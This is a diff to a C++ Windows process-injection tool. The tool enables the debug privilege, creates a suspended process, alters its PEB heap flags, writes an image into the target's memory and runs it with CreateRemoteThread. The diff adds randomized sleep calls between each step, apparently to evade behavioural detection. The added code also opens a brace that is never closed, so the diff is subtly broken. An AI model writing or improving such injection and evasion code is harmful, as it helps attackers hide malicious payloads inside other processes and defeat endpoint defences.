@@ -51,6 +51,9 @@ auto main() -> int {
         std::cerr << "Failed to enable debug privilege" << std::endl;
         return 1;
     }
+    {
+    unsigned int sleep_duration = util::generate_random_sleep_duration(100, 500);
+    Sleep(sleep_duration);
 
     // Create a suspended process
     auto process_info = process::create_suspended_process(exe_path);
@@ -59,6 +62,9 @@ auto main() -> int {
         FreeLibrary(*nt_dll);
         return 1;
     }
+
+    sleep_duration = util::generate_random_sleep_duration(100, 500);
+    Sleep(sleep_duration);
 
     // Print the process ID
     std::cout << "Injected process ID: " << process_info->dwProcessId << std::endl;
@@ -94,10 +100,16 @@ auto main() -> int {
     *nt_global_flag &= ~FLG_HEAP_ENABLE_FREE_CHECK; // Clear heap free-check flag
     *nt_global_flag &= ~FLG_HEAP_VALIDATE_PARAMETERS; // Clear heap validate parameters flag
 
+    sleep_duration = util::generate_random_sleep_duration(100, 500);
+    Sleep(sleep_duration);
+
     // Write the manipulated PEB back to the target process
     if (!process::write_process_memory(process_info->hProcess, peb, &manipulated_peb, sizeof(PEB))) {
         std::cerr << "Failed to write manipulated PEB to target process" << std::endl;
     }
+
+    sleep_duration = util::generate_random_sleep_duration(100, 500);
+    Sleep(sleep_duration);
 
     // Allocate memory in the target process
     auto new_image_base = process::allocate_memory_in_target_process(process_info->hProcess, nt_header->OptionalHeader.SizeOfImage).value_or(nullptr);
@@ -122,11 +134,17 @@ auto main() -> int {
         std::cerr << "Failed to write process memory" << std::endl;
     }
 
+    sleep_duration = util::generate_random_sleep_duration(100, 500);
+    Sleep(sleep_duration);
+
     // Create and manage remote thread
     HANDLE new_thread = CreateRemoteThread(process_info->hProcess, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(reinterpret_cast<ULONG_PTR>(new_image_base) + nt_header->OptionalHeader.AddressOfEntryPoint), nullptr, CREATE_SUSPENDED, nullptr);
     if (!new_thread) {
         std::cerr << "Failed to create remote thread" << std::endl;
     }
+
+    sleep_duration = util::generate_random_sleep_duration(100, 500);
+    Sleep(sleep_duration);
 
     ResumeThread(new_thread);
     SuspendThread(process_info->hThread);
